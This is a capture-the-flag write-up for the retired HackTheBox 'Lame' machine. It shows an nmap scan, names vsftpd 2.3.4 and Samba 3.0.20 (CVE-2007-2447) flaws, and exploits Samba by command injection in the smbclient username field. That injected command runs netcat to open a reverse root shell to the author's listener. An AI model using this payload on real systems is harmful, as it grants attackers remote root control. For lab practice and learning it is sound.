HackTheBox: Lame Writeup

Published: March 22, 2025 | Linux Easy Retired

In this writeup, I'll walk through how I solved the "Lame" machine on HackTheBox. This is one of the earliest machines on the platform and provides a good introduction to basic enumeration and exploitation.

Machine Information

  • Name: Lame
  • IP: 10.10.10.3
  • Difficulty: Easy
  • OS: Linux

Initial Reconnaissance

As always, I started with a basic nmap scan to identify open ports and services: 

$ nmap -sC -sV -oA nmap/lame 10.10.10.3

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1

Several services are running, including FTP, SSH, Samba, and distccd. Let's start by investigating each of these.

Vulnerability Discovery

After examining the service versions, I found that:

  • The FTP server (vsftpd 2.3.4) has a known backdoor vulnerability
  • Samba 3.0.20 is vulnerable to a remote code execution vulnerability (CVE-2007-2447)

Exploitation

I decided to focus on the Samba vulnerability first. This vulnerability allows command injection through the username field when using the "username map script" configuration option.

First, I connected to the Samba server using smbclient: 

$ smbclient //10.10.10.3/tmp

Then, I attempted to exploit the vulnerability by injecting commands in the username field: 

$ smbclient //10.10.10.3/tmp -U "username=`nohup nc -e /bin/bash 10.10.14.10 4444`"

In another terminal, I had a netcat listener ready: 

$ nc -lvnp 4444

Privilege Escalation

After getting initial access, I found that I was already running as the root user, so no further privilege escalation was necessary. 

$ whoami
root

Lessons Learned

This machine taught me several important lessons:

  1. Always check for known vulnerabilities in the specific versions of running services
  2. Older Samba versions can be particularly vulnerable to command injection attacks
  3. Sometimes, exploiting a vulnerability can lead directly to root access without requiring privilege escalation

Conclusion

"Lame" is an excellent starting machine for beginners as it demonstrates basic enumeration and exploitation concepts without complex obstacles. The vulnerabilities are well-documented and provide a good foundation for understanding how to approach more difficult machines.
